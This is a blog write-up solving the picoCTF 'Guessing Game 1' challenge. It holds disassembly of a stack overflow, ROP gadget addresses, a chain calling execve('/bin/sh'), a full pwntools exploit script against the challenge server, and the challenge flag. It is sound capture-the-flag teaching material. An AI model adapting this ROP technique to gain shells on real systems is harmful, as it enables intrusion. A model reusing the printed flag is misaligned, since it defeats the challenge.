# Blog
https://frc6.com/index.php/archives/45/

# Question
### Source
https://play.picoctf.org/events/3/challenges/challenge/90
### Description
I made a simple game to show off my programming skills. See if you can beat it!
[Gussing Game 1.zip][1]
`nc jupiter.challenges.picoctf.org 50583`

# Tools
IDA
VM - Kali Linux
Python
ROPgadget

# Analysis
## Knowledge points
Binary Exploitation
Return-oriented programming (ROP)
The goal of the Challenge Question is to run `execve("/bin/sh",NULL,NULL)` on the remote server.
Tips: No shellcode b/c NX is enabled: you cannot execute stack

## vuln
Analysis vuln.c and found that there is a **Stack Overflow Vuln**: 

    void win() {
        char winner[BUFSIZE];
        printf("New winner!\nName? ");
        fgets(winner, 360, stdin);//overflow vuln
        printf("Congrats %s\n\n", winner);
    }
Grabbing control of `eip` by taking advantage of the vuln to let the program Stack Overflow.

## Gadgets
Run the following commands:

    ROPgadget --binary vuln --only "pop|ret"
    ROPgadget --binary vuln --only "mov|ret"
    ROPgadget --binary vuln --only "syscall|ret"

Do ROP to achieve the goal—`execve("/bin/sh",NULL,NULL)`—by using the following gadgets:

    0x00000000004163f4 : pop rax ; ret
    0x000000000044a6b5 : pop rdx ; ret
    0x0000000000400696 : pop rdi ; ret
    0x0000000000436393 : mov qword ptr [rdi], rdx ; ret
    0x000000000044cc49 : pop rdx ; pop rsi ; ret
    0x000000000040137c : syscall

## Disassembly

### do_stuff()
Input the Gussing Number "84" for the first time (you only need one time if you guess correct so you can access to win() function)

Q: Why "84"
A: Dynamic debugging (IDA debugger or GDB)
Set a breakpoint at the following position:

    .text:0000000000400BBC                 mov     [rbp+var_ans], rax

`rax` will be equal to 84

### win()
    .text:0000000000400C40                 public win
    .text:0000000000400C40 win             proc near               ; CODE XREF: main+70↓p
    .text:0000000000400C40
    .text:0000000000400C40 winner          = byte ptr -70h
    .text:0000000000400C40
    .text:0000000000400C40 ; __unwind {
    .text:0000000000400C40                 push    rbp
    .text:0000000000400C41                 mov     rbp, rsp
    .text:0000000000400C44                 sub     rsp, 70h
    .text:0000000000400C48                 lea     rdi, aNewWinnerName ; "New winner!\nName? "
    .text:0000000000400C4F                 mov     eax, 0
    .text:0000000000400C54                 call    printf
    .text:0000000000400C59                 mov     rdx, cs:stdin
    .text:0000000000400C60                 lea     rax, [rbp+winner]
    .text:0000000000400C64                 mov     esi, 168h
    .text:0000000000400C69                 mov     rdi, rax
    .text:0000000000400C6C                 call    fgets
    .text:0000000000400C71                 lea     rax, [rbp+winner]
    .text:0000000000400C75                 mov     rsi, rax
    .text:0000000000400C78                 lea     rdi, aCongratsS ; "Congrats %s\n\n"
    .text:0000000000400C7F                 mov     eax, 0
    .text:0000000000400C84                 call    printf
    .text:0000000000400C89                 nop
    .text:0000000000400C8A                 leave
    .text:0000000000400C8B                 retn
    .text:0000000000400C8B ; } // starts at 400C40
    .text:0000000000400C8B win             endp

The return address of the function is stored at `rbp+8`, so overwrite it by overflowing the stack

## ROP: Gadgets
We are planning to run the following assembly code after win() return.

    ret        (retn of win() at .text:0000000000400C8B)
    pop rax
    ret
    pop rdx
    ret
    pop rdi
    ret
    mov qword ptr [rdi], rdx
    ret
    pop rdx
    pop rsi
    ret
    syscall

In order to run `execve("/bin/sh",NULL,NULL)` successfully, `rax` should be equal to 59 durning `syscall` is running, `rdi` should be the pointer of "/bin/sh", and `rsi` and `rdx` should be equal to 0 (NULL).

So, we should let the Stack like this:

    rbp+8		0x00000000004163f4			Address of one of Gadget
    rbp+10h		59					rax
    rbp+18h		0x000000000044a6b5			Address of one of Gadget			
    rbp+20h		"/bin/sh"				rdx (temporary use; will be overwrite later)
    rbp+28h		0x0000000000400696			Address of one of Gadget
    rbp+30h		0x00000000006BA770			rdi
    rbp+38h		0x0000000000436393			Address of one of Gadget
    rbp+40h		0x000000000044cc49			Address of one of Gadget
    rbp+48h		0					rdx
    rbp+50h		0					rsi
    rbp+58h		0x000000000040137c			syscall

## Remote to Find Flag: Python

Run the following Python program:

    from pwn import *
    
    sh = remote('jupiter.challenges.picoctf.org',50583)
    
    p = make_packer('all', endian='big', sign='unsigned')
    p64 = make_packer(64, endian='little', sign='unsigned')
    
    payload = p(0x90)*(0x70+8)	#rbp-70h
    payload += p64(0x4163f4)	#rbp+8h
    payload += p64(59)			#rbp+10h
    payload += p64(0x44a6b5)	#rbp+18h
    payload += p(0x2F62696E2F736800)	#rbp+20h
    payload += p64(0x400696)	#rbp+28h
    payload += p64(0x6BA770)	#rbp+30h
    payload += p64(0x436393)	#rbp+38h
    payload += p64(0x44cc49)	#rbp+40h
    payload += p64(0)			#rbp+48h
    payload += p64(0)			#rbp+50h
    payload += p64(0x40137c)	#rbp+58h
    
    sh.recvuntil('guess?\n')
    sh.sendline(p(0x3834))#84
    
    sh.recvuntil('\nName? ')
    sh.sendline(payload)
    
    sh.interactive()

![result.png][2]

So the Flag is `picoCTF{r0p_y0u_l1k3_4_hurr1c4n3_1ed68bc5575f6be1}`

  [1]: https://frc6.com/usr/uploads/2020/10/2453405697.zip
  [2]: https://frc6.com/usr/uploads/2020/10/1353396828.png
